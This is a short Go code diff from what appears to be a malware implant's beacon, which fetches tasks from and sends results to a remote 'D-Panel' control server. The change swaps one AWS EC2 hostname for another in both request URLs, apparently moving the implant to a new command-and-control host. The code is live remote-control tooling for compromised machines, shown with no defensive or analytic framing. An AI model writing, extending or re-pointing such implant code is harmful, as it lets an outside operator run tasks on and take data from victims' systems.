@@ -122,7 +122,7 @@ func (b *Beacon) pullPendingTasks() ([]tasks.Task, error) {
 
 	// Make request to D-Panel task endpoint
 	resp, err := b.tun.MakeRequest("POST", 
-		fmt.Sprintf("https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/tasks"), 
+		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/tasks"), 
 		bytes.NewReader(reqBody))
 	if err != nil {
 		return nil, fmt.Errorf("task request failed: %w", err)
@@ -152,7 +152,7 @@ func (b *Beacon) sendResult(result tasks.TaskResult) error {
 	}
 
 	resp, err := b.tun.MakeRequest("POST",
-		fmt.Sprintf("https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/result"),
+		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/result"),
 		bytes.NewReader(resultBody))
 	if err != nil {
 		return fmt.Errorf("result request failed: %w", err)
